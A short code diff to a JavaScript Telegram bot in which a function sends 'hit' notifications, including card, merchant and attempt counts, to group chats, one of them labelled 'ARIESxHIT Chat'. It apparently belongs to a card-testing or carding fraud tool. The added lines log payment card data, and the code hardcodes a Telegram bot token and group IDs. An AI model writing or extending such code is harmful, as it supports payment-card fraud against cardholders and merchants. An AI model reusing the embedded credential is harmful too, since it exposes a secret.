@@ -496,6 +496,15 @@ const MAIN_MENU_KEYBOARD = {
 
 // Send hit notification to group chats
 async function sendHitToGroups(hitData, checkoutUrl) {
+  console.log('[SEND_HIT_GROUPS] 🚨🚨🚨 FUNCTION ENTERED! 🚨🚨🚨');
+  console.log('[SEND_HIT_GROUPS] Real extension hit data:', {
+    userId: hitData.userId,
+    userName: hitData.userName,
+    card: hitData.card,
+    merchant: hitData.merchant,
+    attempts: hitData.attempts
+  });
+
   // DIRECT FIX: Use hardcoded values that we know work
   const BOT_TOKEN = '8268278005:AAG49bxahCC_JjC_vG-pE8lv5RqTU0Duh5M';
   const GROUP_1 = '-1003835715499'; // ARIESxHIT Chat
